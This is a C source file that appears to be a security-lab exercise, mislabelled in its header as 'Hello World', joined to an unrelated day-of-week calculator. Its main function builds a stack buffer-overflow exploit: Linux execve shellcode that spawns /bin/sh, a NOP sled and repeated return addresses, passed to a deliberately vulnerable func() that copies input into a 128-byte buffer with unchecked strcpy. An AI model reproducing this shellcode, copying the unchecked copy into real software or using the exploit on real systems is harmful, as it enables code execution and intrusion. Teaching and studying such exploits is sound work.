/*
 ============================================================================
 Name        : MyTest.c
 Author      : Alex
 Version     :
 Copyright   : Your copyright notice
 Description : Hello World in C, Ansi-style
 ============================================================================
 */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/sdt.h>
#include <stdio.h>
#include <stdint.h>

char shellcode[] = "\x31\xc0"
		"\x50"
		"\x68" "//sh"
		"\x68" "/bin"
		"\x89\xe3"
		"\x50"
		"\x53"
		"\x89\xe1"
		"\x99"
		"\xb0\x0b"
		"\xcd\x80";


int fm(int date, int month, int year) {
	int fmonth, leap;

	//leap function 1 for leap & 0 for non-leap
	if ((year % 100 == 0) && (year % 400 != 0))
		leap = 0;
	else if (year % 4 == 0)
		leap = 1;
	else
		leap = 0;

	fmonth = 3 + (2 - leap) * ((month + 2) / (2 * month))
			+ (5 * month + month / 9) / 2;

	//bring it in range of 0 to 6
	fmonth = fmonth % 7;

	return fmonth;
}

//----------------------------------------------
int day_of_week(int date, int month, int year) {

	int dayOfWeek;
	int YY = year % 100;
	int century = year / 100;

	printf("\nDate: %d/%d/%d \n", date, month, year);

	dayOfWeek = 1.25 * YY + fm(date, month, year) + date - 2 * (century % 4);

	//remainder on division by 7
	dayOfWeek = dayOfWeek % 7;

	switch (dayOfWeek) {
	case 0:
		printf("weekday = Saturday");
		break;
	case 1:
		printf("weekday = Sunday");
		break;
	case 2:
		printf("weekday = Monday");
		break;
	case 3:
		printf("weekday = Tuesday");
		break;
	case 4:
		printf("weekday = Wednesday");
		break;
	case 5:
		printf("weekday = Thursday");
		break;
	case 6:
		printf("weekday = Friday");
		break;
	default:
		printf("Incorrect data");
	}
	return 0;
}

int func(char *str) {

	char buffer[128];
	printf("%p->%p\n", buffer, buffer + 127);
	strcpy(buffer, str);

	return 1;
}

int main(int argc, char **argv) {
	char mybuffer[1024];

	/* Construct an attack shellcode to pop a shell.
	 * You should put your shellcode into the "buffer" array, and
	 * pass the "buffer" to the function "func".
	 * Your code here:
	 */
	int addr = (int) (mybuffer - 140);
	int *ptr = (int*) mybuffer;
	int i;

	for (i = 0; i < 1024; i += 4) {
		*ptr = addr;
		ptr++;
	}

	char *nop_ptr = mybuffer;
	for (i = 0; i < 128 / 2; ++i)
		*(nop_ptr++) = 0x90;

	nop_ptr = mybuffer + (128 / 2 - strlen(shellcode) / 2);
	for (i = 0; i < strlen(shellcode); ++i)
		*(nop_ptr++) = shellcode[i];

	func(mybuffer);

	int date, month, year;

	printf("\nEnter the year ");
	scanf("%d", &year);

	printf("\nEnter the month ");
	scanf("%d", &month);

	printf("\nEnter the date ");
	scanf("%d", &date);

	day_of_week(date, month, year);

	printf("Returned Properly\n");
	return 1;

}
